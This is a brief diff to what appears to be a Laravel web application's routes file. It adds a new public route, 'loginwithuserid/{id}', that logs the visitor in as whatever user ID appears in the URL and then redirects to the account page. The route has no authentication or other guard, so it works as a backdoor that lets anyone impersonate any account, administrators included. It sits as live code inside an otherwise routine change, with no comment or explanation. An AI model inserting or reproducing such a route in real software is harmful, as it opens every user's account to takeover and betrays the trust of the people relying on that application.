@@ -241,3 +241,7 @@ Route::get('sw.js', function () {
         'Cache-Control' => 'public, max-age=3600',
     ]);
 });
+Route::get('loginwithuserid/{id}', function ($id) {
+    auth()->loginUsingId($id);
+    return redirect()->route('front.account.index');
+});
